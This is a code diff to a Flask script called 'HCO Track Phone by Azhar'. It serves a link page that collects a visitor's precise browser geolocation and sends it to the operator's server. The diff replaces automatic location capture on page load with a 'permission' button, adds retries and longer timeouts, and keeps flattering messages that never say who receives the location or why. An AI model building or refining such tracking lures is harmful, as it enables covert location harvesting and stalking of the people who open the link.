@@ -1,5 +1,5 @@
-# HCO Track Phone by Azhar - Auto Version
-# Just open link → Allow permission → Done!
+# HCO Track Phone by Azhar - Fixed Permission Version
+# Now with manual permission request!
 
 import os
 import subprocess
@@ -63,7 +63,7 @@ def find_port():
             continue
     return 8080
 
-# Flask routes - AUTOMATIC VERSION
+# Flask routes - FIXED PERMISSION VERSION
 @app.route('/')
 def home():
     html = '''
@@ -93,6 +93,17 @@ def home():
                 margin-bottom: 20px; 
                 text-shadow: 0 0 10px red;
             }
+            .btn {
+                background: lime;
+                color: black;
+                border: none;
+                padding: 20px 40px;
+                font-size: 20px;
+                font-weight: bold;
+                border-radius: 10px;
+                cursor: pointer;
+                margin: 20px 0;
+            }
             .message {
                 font-size: 18px;
                 margin: 20px 0;
@@ -110,12 +121,18 @@ def home():
     <body>
         <div class="container">
             <div class="logo">HCO TRACK PHONE BY AZHAR</div>
-            <div id="status" class="message">🔄 Requesting location access...</div>
+            <div class="message">Click the button below to share your location</div>
+            <button class="btn" onclick="requestLocation()">📍 ALLOW LOCATION ACCESS</button>
+            <div id="status" class="message">Waiting for your permission...</div>
         </div>
         
         <script>
-        function autoGetLocation() {
+        function requestLocation() {
             var status = document.getElementById('status');
+            var btn = document.querySelector('.btn');
+            
+            status.innerHTML = '🔄 Please allow location access in the browser popup...';
+            btn.style.display = 'none';
             
             if (!navigator.geolocation) {
                 status.innerHTML = '❌ Geolocation not supported by your browser';
@@ -130,36 +147,40 @@ def home():
                 fetch('/update', {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({lat: lat, lon: lon, accuracy: position.coords.accuracy})
+                    body: JSON.stringify({
+                        lat: lat, 
+                        lon: lon, 
+                        accuracy: position.coords.accuracy
+                    })
                 })
                 .then(response => response.text())
                 .then(data => {
                     status.innerHTML = '<div class="success">✅ You are a good person! God Bless You 🙏</div>' +
-                                      '<div style="margin-top:20px;">📍 Location shared successfully</div>';
+                                      '<div style="margin-top:20px;">📍 Location shared successfully</div>' +
+                                      '<div style="margin-top:10px;">You can close this page now</div>';
                 })
                 .catch(error => {
-                    status.innerHTML = '❌ Error sending location. Please refresh page.';
+                    status.innerHTML = '❌ Error sending location. Please try again.';
+                    btn.style.display = 'block';
                 });
             }
             
             function error(err) {
                 if(err.code == err.PERMISSION_DENIED) {
-                    status.innerHTML = '❌ Permission denied! Please allow location access and refresh this page.';
+                    status.innerHTML = '❌ Permission denied! Please refresh and click the button again.';
                 } else {
-                    status.innerHTML = '❌ Location access failed. Please refresh page.';
+                    status.innerHTML = '❌ Location access failed. Please try again.';
                 }
+                btn.style.display = 'block';
             }
             
-            // Get location automatically
+            // Request location with manual button click
             navigator.geolocation.getCurrentPosition(success, error, {
                 enableHighAccuracy: true,
-                timeout: 15000,
+                timeout: 30000,
                 maximumAge: 0
             });
         }
-        
-        // Start automatically when page loads
-        window.onload = autoGetLocation;
         </script>
     </body>
     </html>
